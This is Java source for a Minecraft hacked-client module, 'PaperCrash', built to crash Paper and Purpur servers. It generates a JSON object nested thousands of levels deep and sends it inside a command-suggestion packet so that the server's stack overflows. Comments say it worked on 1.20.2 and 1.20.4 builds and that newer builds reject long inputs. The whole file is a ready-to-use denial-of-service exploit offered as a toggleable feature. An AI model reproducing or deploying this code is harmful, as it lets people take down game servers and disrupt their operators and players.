package org.op;
import com.google.gson.JsonObject;
import net.minecraft.network.protocol.game.ServerboundCommandSuggestionPacket;
import org.rusherhack.client.api.events.client.EventUpdate;
import org.rusherhack.client.api.feature.module.ModuleCategory;
import org.rusherhack.client.api.feature.module.ToggleableModule;


import org.rusherhack.core.event.subscribe.Subscribe;
import org.rusherhack.core.setting.NumberSetting;


public class PaperCrash extends ToggleableModule {

    /**
     * Variables
     */
    private final NumberSetting<Integer> levels = new NumberSetting<>("levels", 2000, 0, 5000);

    public PaperCrash() {
        super("PaperCrash", "crash for paper servers", ModuleCategory.CLIENT);


        this.registerSettings(
                this.levels
        );
    }

    @Subscribe
    private void onUpdate(EventUpdate event) {
        String overflow;
        try {
            overflow = generateJsonObject(this.levels.getValue()).toString().replace("\"", ""); // Levels should be configurable from 2200-3500
        } catch (StackOverflowError e) {
            e.printStackTrace();
            // Should not happen, server stack is more overloaded reading that.
            return;
        }

        // Seemed to work on 1.20.2, 1.20.4 paper/purpur servers, does not anymore.
        // Latest server builds can kick if partialCommand length is greater than 6144, probably can be compressed even more.
        mc.player.connection.send(new ServerboundCommandSuggestionPacket(0, "msg @a[nbt=" + overflow + "]"));
        this.toggle();
    }

    public static JsonObject generateJsonObject(int levels) {
        JsonObject jsonObject = new JsonObject();
        JsonObject currentJsonObject = jsonObject;

        for (int i = 0; i < levels; i++) {
            JsonObject newJsonObject = new JsonObject();
            currentJsonObject.add("a", newJsonObject);
            currentJsonObject = newJsonObject;
        }

        return jsonObject;
    }

}